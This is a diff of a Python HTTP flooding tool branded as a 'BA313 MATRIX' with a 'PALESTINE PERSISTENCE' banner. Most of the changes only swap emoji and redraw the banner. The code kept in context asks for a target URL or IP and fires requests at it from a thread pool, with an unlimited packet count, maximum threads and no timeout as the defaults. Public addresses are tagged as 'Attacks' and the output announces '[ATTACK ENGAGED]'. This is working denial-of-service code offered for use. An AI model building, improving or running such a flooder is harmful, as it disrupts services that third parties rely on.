@@ -9,7 +9,7 @@ from concurrent.futures import ThreadPoolExecutor
 # In-memory session tracking (RAM only, fully purged on exit)
 SESSION_METRICS = {
     "total_packets": 0,
-    "network_types": {"Local Loopback": 0, "Private LAN": 0, "Attacks 🚀☀️": 0, "Invalid/Unknown": 0},
+    "network_types": {"Local Loopback": 0, "Private LAN": 0, "Attacks 🚀💥": 0, "Invalid/Unknown": 0},
     "http_status_distribution": {
         "200 OK": 0,
         "3xx Redirect": 0,
@@ -46,7 +46,7 @@ def analyze_network_type(ip_address):
             (octets[0] == 192 and octets[1] == 168)):
             return "Private LAN"
 
-        return "Attacks 🚀☀️"
+        return "Attacks 🚀💥"
     except Exception:
         return "Invalid/Unknown"
 
@@ -103,13 +103,13 @@ def execute_network_probe(host, port, scheme, path, timeout, net_type):
         SESSION_METRICS["http_status_distribution"][category] += 1
 
         # Cyberpunk live status markers
-        status_emoji = "💠”
+        status_emoji = "🔹"
         if status_str == "200":
             status_emoji = "🟢"
         elif status_str.startswith("3"):
             status_emoji = "🟡"
         elif status_str.startswith("4") or status_str.startswith("5"):
-            status_emoji = "🔴”
+            status_emoji = "🔴"
 
         print(f"{status_emoji} [NET_STREAM] Route: {net_type} | Status: {status_str} | Latency: {rtt_latency:.4f}s")
 
@@ -119,43 +119,42 @@ def execute_network_probe(host, port, scheme, path, timeout, net_type):
 
 def print_banner():
     """Renders the custom BA313 box art banner frame layout cleanly."""
-    print("======    ==          ===      =======  ==  ==      ===       ======     ==     ==   ==     ==")
-    print("==   ==   ==         == ==     ==       == ==      == ==      ==   ==    == === ==     ==  ==")
-    print("======    ==        =======    ==       ===       =======     =====      ==  =  ==       ==")
-    print("==   ==   ==       ==     ==   ==       == ==    ==     ==    ==   ==    ==     ==       ==")
-    print("======    ======  ==       ==  =======  ==  ==  ==       ==   ==    ==   ==     ==       ==")
+    print("┌────────────────────────────────────────────────────────┐")
+    print("│ █▀▄ █   █▀█ █▀▀ █▄▀  █▀█ █▀▄ █▀▄▀█ █ █  █▀█ ▄█  █▀█    │")
+    print("│ █▄█ █▄▄ █▀█ █▄▄ █ █  █▀█ █▀▄ █ █ █ ▀▄█  ▄▄█  █  ▄▄█    │")
+    print("└────────────────────────────────────────────────────────┘")
     print(" >> BA313 MATRIX ENGAGED // PALESTINE PERSISTENCE ACTIVE\n")
 
 def print_summary():
     """Prints neon-styled summary statistics metrics."""
     avg_latency = (SESSION_METRICS["total_rtt_latency"] / SESSION_METRICS["successful_network_handshakes"]) if SESSION_METRICS["successful_network_handshakes"] > 0 else 0.0
 
-    print("\n" + "🪩 " + "=" * 61 + " 🪩")
-    print("               🔗  LIVE NETWORK TERMINAL SUMMARY  🔗               ")
+    print("\n" + "🔮 " + "=" * 61 + " 🔮")
+    print("               🧬  LIVE NETWORK TERMINAL SUMMARY  🧬               ")
     print("=" * 65)
-    print(f" 🔈  Total Probes Dispatched:  {SESSION_METRICS['total_packets']}")
-    print(f" ⌛️ Average Pipeline Latency:  {avg_latency:.4f} seconds")
+    print(f" 🛰️  Total Probes Dispatched:  {SESSION_METRICS['total_packets']}")
+    print(f" ⏳ Average Pipeline Latency:  {avg_latency:.4f} seconds")
 
     print("\n[💠] NETWORK ROUTING DISTRIBUTION:")
     for network, count in SESSION_METRICS["network_types"].items():
         if count > 0:
-            print(f"  ⚡️ {network} Channels Active: {count} beams")
+            print(f"  ⚡ {network} Channels Active: {count} beams")
 
     print("\n[🎯] TARGET PROTOCOL DISTRIBUTION:")
     for status, count in SESSION_METRICS["http_status_distribution"].items():
         if count > 0:
-            marker = "📟" if "200" in status else ("⚠️" if "400" in status or "Dropped" in status else "🔴")
+            marker = "📟" if "200" in status else ("⚠️" if "400" in status or "Dropped" in status else "🛑")
             print(f"  {marker} {status}: {count} responses")
 
     print("=" * 65)
-    print("✨️ [VOLATILE PURGE] Memory registers wiped cleanly. Session matrices dissolved.")
+    print("✨ [VOLATILE PURGE] Memory registers wiped cleanly. Session matrices dissolved.")
 
 def main():
     print_banner()
 
-    raw_target = input("🪩 Enter Target Core Link (URL/IP): ").strip()
+    raw_target = input("🔮 Enter Target Core Link (URL/IP): ").strip()
     if not raw_target:
-        print("❌️ [CRITICAL ERROR] Target input stream is blank.")
+        print("❌ [CRITICAL ERROR] Target input stream is blank.")
         return
 
     host, port, scheme, path = clean_target(raw_target)
@@ -164,39 +163,39 @@ def main():
         target_ip = socket.gethostbyname(host)
         net_type = analyze_network_type(target_ip)
     except socket.gaierror:
-        print("❌️ [NET_FAILURE] Host resolution failed. Target isolated or offline.")
+        print("❌ [NET_FAILURE] Host resolution failed. Target isolated or offline.")
         return
 
     # User Configuration Input Engine
-    print("\n🛠 [CONFIG ENGINE] Adjust parameters or press ENTER for Infinity parameters:")
+    print("\n🛠️ [CONFIG ENGINE] Adjust parameters or press ENTER for Infinity parameters:")
 
-    packet_input = input(" ■ Packets to stream [Default: ♾️]: ").strip()
+    packet_input = input(" ▫️ Packets to stream [Default: ♾️]: ").strip()
     infinite_packets = False if packet_input else True
     total_packets = int(packet_input) if not infinite_packets else 0
 
-    thread_input = input(" ■ Concurrent thread pipes [Default: Max OS Threading]: ").strip()
+    thread_input = input(" ▫️ Concurrent thread pipes [Default: Max OS Threading]: ").strip()
     threads = int(thread_input) if thread_input else None
 
-    timeout_input = input(" ■ Timeout limit (Seconds) [Default: ♾️/None]: ").strip()
+    timeout_input = input(" ▫️ Timeout limit (Seconds) [Default: ♾️/None]: ").strip()
     timeout = float(timeout_input) if timeout_input else None
 
-    print("\n🔈 " + "-" * 61 + " 🔈")
-    print(f" 🪩 Target Endpoint:   {scheme}://{host}:{port}{path} ({target_ip})")
-    print(f" 🀄 Network Layer:    {net_type}")
-    print(f" ⚡️ Pipeline Load:    {'Infinity' if infinite_packets else total_packets} frames | {'Max Capacity' if threads is None else threads} workers")
-    print(f" ⌛️ Expiry Vector:    {'Disabled (Infinite Hold)' if timeout is None else f'{timeout}s'}")
+    print("\n📡 " + "-" * 61 + " 📡")
+    print(f" 🌐 Target Endpoint:   {scheme}://{host}:{port}{path} ({target_ip})")
+    print(f" 🎚️ Network Layer:    {net_type}")
+    print(f" ⚡ Pipeline Load:    {'Infinity' if infinite_packets else total_packets} frames | {'Max Capacity' if threads is None else threads} workers")
+    print(f" ⏳ Expiry Vector:    {'Disabled (Infinite Hold)' if timeout is None else f'{timeout}s'}")
     print("-" * 65 + "\n")
 
     # Multithreading Execution Matrix
     try:
         with ThreadPoolExecutor(max_workers=threads) as executor:
             if infinite_packets:
-                print("☀️ [ATTACK ENGAGED] Continuous transmission online. Strike [Ctrl+C] to compile final data telemetry...\n")
+                print("💥 [ATTACK ENGAGED] Continuous transmission online. Strike [Ctrl+C] to compile final data telemetry...\n")
                 while True:
                     executor.submit(execute_network_probe, host, port, scheme, path, timeout, net_type)
                     time.sleep(0.001)  # Mitigates processor starvation
             else:
-                print("☀️ [ATTACK ENGAGED] Finite transmission online.\n")
+                print("💥 [ATTACK ENGAGED] Finite transmission online.\n")
                 futures = [executor.submit(execute_network_probe, host, port, scheme, path, timeout, net_type) for _ in range(total_packets)]
                 for future in futures:
                     future.result()
@@ -209,5 +208,5 @@ if __name__ == "__main__":
     try:
         main()
     except KeyboardInterrupt:
-        print("\n☀️ [FORCED ABORT] Hard break intercepted. System RAM caches dropped immediately.")
+        print("\n💥 [FORCED ABORT] Hard break intercepted. System RAM caches dropped immediately.")
         sys.exit()
